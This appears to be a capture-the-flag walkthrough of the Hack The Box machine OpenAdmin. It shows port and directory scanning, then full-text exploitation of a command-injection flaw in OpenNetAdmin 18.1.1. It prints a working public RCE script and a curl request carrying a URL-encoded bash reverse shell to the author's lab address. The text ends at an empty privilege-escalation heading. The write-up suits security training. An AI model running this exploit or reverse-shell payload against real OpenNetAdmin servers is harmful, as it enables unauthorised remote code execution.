---
title: "HTB Walkthrough: OpenAdmin"
date: 2022-05-10T17:56:30-04:00 
categories:
  - HackTheBox
header:
  teaser: /assets/images/HTB/openAdmin/openAdmin.png
tags:
  - Easy
  - Linux Host
  - OS Command Injection
  - SSH
---

![OpenAdmin Logo](/assets/images/HTB/openAdmin/openAdmin.png)

**Welcome** to this walkthrough for the [Hack The Box](https://www.hackthebox.com/) machine OpenAdmin. This one is listed as an 'easy' box and has also been retired, so access is only provided to those that have purchased VIP access to HTB.
Because of this, you may notice that it is necessary to be connected to HTB's VIP VPN server, rather than the free server. To do this, change the dropdown selection in the top right corner where you select "Connect"
to "VIP" and download the .ovpn package (yes, even as a paid user, you must toggle between free and paid VPN packages depending on the machine).

---

## Scanning  

I went ahead and started my NMap scan and then plugged the IP address into the browser to check for HTTP and HTTPS respectfully: **10.10.10.171:80** & **10.10.10.171:443**  

Port 80 loaded successfully so I ran my directory buster and Nikto scan as well :  

```bash
sudo nmap -sS -A -sV -T5 -p- 10.10.10.171 | tee nmap_full.txt

# Since Port 80 loaded an Apache server default page, I am using an Apache-based wordlist:
dirb http://10.10.10.171 /usr/share/seclists/Discovery/Web-Content/Apache.fuzz.txt | tee dirb-apache.log 

nikto -h "http://10.10.10.171/" | tee nikto.log 
```  

### NMap Results  

*** TCP ***  

Our TCP scan did not return many open ports :  

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
```  

*** UDP ***  

It is always good to check for UDP ports too, to identify more services and get a better idea of your attack surface.  

> Note: UDP is a connectionless Layer 4 protocol, meaning it takes longer and is less accurate to scan than TCP.
> For this reason, I normally start by only scanning the top 1000 ports.  

```
sudo nmap -sU 10.10.10.171 --open --top-ports=1000 | tee nmap-UDP.log

PORT      STATE         SERVICE

688/udp   open|filtered realm-rusd
989/udp   open|filtered ftps-data
1040/udp  open|filtered netarx
1064/udp  open|filtered jstel
16700/udp open|filtered unknown
18250/udp open|filtered unknown
20366/udp open|filtered unknown
21514/udp open|filtered unknown
21780/udp open|filtered unknown
22043/udp open|filtered unknown
22341/udp open|filtered unknown
32528/udp open|filtered unknown
47808/udp open|filtered bacnet
```

### Nikto Results  

```
+ Server: Apache/2.4.29 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 2aa6, size: 597dbd5dcea8b, mtime: gzip
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: POST, OPTIONS, HEAD, GET 
+ OSVDB-3233: /icons/README: Apache default file found.
```  

### Directory Busters  

Dirb was not handling the Seclist correctly, and I think that created an issue with finding existing directories :  

```
Dirb Results : 
dirb http://10.10.10.171 /usr/share/seclists/Discovery/Web-Content/Apache.fuzz.txt | tee dirb-apache.log

http://10.10.10.171//index.html (CODE:200|SIZE:10918)
http://10.10.10.171//server-status (CODE:403|SIZE:277)
```  

So, instead of copying the list and removing the additional backslash from each entry and re-running it, I tried Dirbuster with the Apache Seclist.  

```
Dirbuster Results : 

* Directories * 
/
/icons/
/marga/
/marga/images/
/marga/fonts/
/marga/fonts/flaticon/
/marga/fonts/flaticon/svg/
/marga/js/
/marga/fonts/flaticon-1/
/marga/fonts/icomoon/
/marga/fonts/flaticon/license/
/marga/fonts/flaticon-1/font/
/marga/fonts/flaticon-1/license/
/marga/fonts/icomoon/demo-files/
/marga/fonts/icomoon/fonts/
```    

I decided to also run dirb with a standard wordlist :  

```
dirb http://10.10.10.171/ /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt | tee dirb-small.log

http://10.10.10.171/music/                                                                          
http://10.10.10.171/artwork/ 
```  

## Web Enumeration - Port 80  

There are a few interesting directories and services running.  

### Marga  

>10.10.10.171/marga  

This appears to be a standard web-template created by Colorlib with very little information in it.  

![Marga Template Site Herring](/assets/images/HTB/openAdmin/marga.png)  

There is an email form on the site as well as some basic js plugins but nothing that really stands out yet.  

### Arcwork  

>10.10.10.171/artwork  

This is another Colorlib template-built webpage named ARCWORK :  

![Arcwork Template Site Herring](/assets/images/HTB/openAdmin/arcwork.png)  

After clicking through the nav-bar tabs, I get the same impression that this is just as unhelpful as Marga.  

### SOLMusic  

>10.10.10.171/music  

Here we have, for a third time, another templated-style webpage void of valuable information, however, our nav-bar has a **Login** option.  

![SOLMusic Template Site](/assets/images/HTB/openAdmin/solmusic.png)  

It is good to investigate login forms in general, and this one takes us to a unique page : 10.10.10.171/ona  

### OpenNetAdmin - Port 80  

>10.10.10.171/ona  

This redirection logs us into a service called OpenNetAdmin (ONA) as the user *guest*  

By viewing the HTTP requests, we see that we are assigned two cookies initially when accessing /ona :  

```
Set-Cookie: ona_context_name=DEFAULT  
Set-Cookie: ONA_SESSION_ID=ip7rss3bo39ocuki0kk9maqd77; path=/  
```  

ONA is an opensource, Ajax-enabled IP Address Management (IPAM) system that provides database managed inventory of your IPs via web GUI or CLI.  

![Open Net Admin Guest Login](/assets/images/HTB/openAdmin/ona.png)  

Take note of the explicitly outdated version number : v18.1.1  
We also get a nice chunk of database information.  

Googling ONA and exploring the [public demo app](https://demo.opennetadmin.com/) reveals default credential information : 

![Default Cred. Info](/assets/images/HTB/openAdmin/ona-admin.png)  

## Initial Shell - www-data 

Well since we know that ONA is running an outdated version (18.1.1), I did a quick check via searchsploit :  

```
searchsploit opennet

OpenNetAdmin 13.03.01 - Remote Code Execution                                     | php/webapps/26682.txt
OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)                      | php/webapps/47772.rb
OpenNetAdmin 18.1.1 - Remote Code Execution                                       | php/webapps/47691.sh

# Wow! An exact match. Let's download the bash(.sh) version:  

searchsploit -m 47691
```  

### Modifying RCE Exploit  

So, here is the bash script that we downloaded via searchsploit :  

```bash
# Exploit Title: OpenNetAdmin v18.1.1 RCE
# Date: 2019-11-19
# Exploit Author: mattpascoe
# Vendor Homepage: http://opennetadmin.com/
# Software Link: https://github.com/opennetadmin/ona
# Version: v18.1.1
# Tested on: Linux

#!/bin/bash

URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```  

I successfully executed remote commands by firing them individually (you can also chain them via semicolon):  

> Example: ./47691.sh http://10.10.10.171/ona/login.php cd /; ls-la; cd /tmp; echo "hi" > greeting.txt  

But this was extremely slow, so I decided to curl the exploit myself and throw a [reverse payload](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) in it to gain an interactive shell.  

Had a couple issues getting it to work, but I just copied the original, deleted the "echo" cmd, url-encoded a bash payload to add instead and ran Netcat :  

```bash
nc -nvlp 4242
```  

```bash
# reverse shell payload set for 10.10.14.42:4242

curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;bash -c 'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.42%2F4242%200%3E%261'&xajaxargs[]=ping" http://10.10.10.171/ona/login.php
```  

Now checking back on our Netcat listener, we have a shell :  

>www-data@openadmin  

## Privilege Escalation  

